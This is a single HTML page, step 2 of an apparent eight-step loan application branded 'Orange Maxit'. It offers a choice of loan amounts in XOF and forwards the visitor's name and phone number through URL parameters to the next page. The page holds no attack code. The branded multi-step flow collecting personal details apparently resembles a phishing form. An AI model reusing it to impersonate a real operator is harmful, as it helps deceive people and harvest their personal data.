<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Orange Maxit - Étape 2</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen">
    <div class="max-w-md w-full bg-white shadow-lg rounded-2xl p-6 m-4">
        <div class="text-center mb-6">
            <span class="bg-orange-600 text-white font-bold px-3 py-1 rounded-lg text-sm">Étape 2 sur 8</span>
            <h1 class="text-xl font-bold text-gray-800 mt-2">Montant du Prêt</h1>
        </div>
        <form action="page3.html" method="GET" class="space-y-4">
            <input type="hidden" name="fullName" id="fullName">
            <input type="hidden" name="phone" id="phone">
            <div>
                <label class="block text-sm font-medium text-gray-700 mb-1">Sélectionnez le montant (XOF)</label>
                <select name="amount" class="w-full px-4 py-3 border rounded-lg bg-white focus:ring-2 focus:ring-orange-500">
                    <option value="25000">25 000 XOF</option>
                    <option value="50000">50 000 XOF</option>
                    <option value="100000" selected>100 000 XOF</option>
                    <option value="250000">250 000 XOF</option>
                    <option value="500000">500 000 XOF</option>
                </select>
            </div>
            <button type="submit" class="w-full bg-orange-600 hover:bg-orange-700 text-white font-semibold py-3 rounded-lg shadow">Continuer</button>
        </form>
    </div>
    <script>
        const params = new URLSearchParams(window.location.search);
        document.getElementById('fullName').value = params.get('fullName') || '';
        document.getElementById('phone').value = params.get('phone') || '';
        // Forward parameters for subsequent pages
        document.querySelector('form').addEventListener('submit', (e) => {
            e.preventDefault();
            const url = new URL('page3.html', window.location.origin);
            url.searchParams.set('fullName', params.get('fullName'));
            url.searchParams.set('phone', params.get('phone'));
            url.searchParams.set('amount', document.querySelector('select[name="amount"]').value);
            window.location.href = url.toString();
        });
    </script>
</body>
</html>
